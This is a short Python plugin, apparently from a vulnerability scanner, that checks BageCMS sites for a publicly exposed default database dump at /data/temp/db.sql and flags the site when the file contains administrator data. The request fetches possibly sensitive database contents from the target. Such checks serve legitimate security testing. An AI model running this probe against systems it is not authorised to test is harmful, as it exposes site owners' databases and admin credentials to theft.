# coding:utf-8
# bagecms默认数据库泄漏
import requests
import  urllib

class Exploit:

    def attack(self,url):
        req = requests.get(url+'/data/temp/db.sql')
        if req.status_code == 200 and '管理员' in req.text:
            return '{} has default dbinfo leakage!!'.format(url)
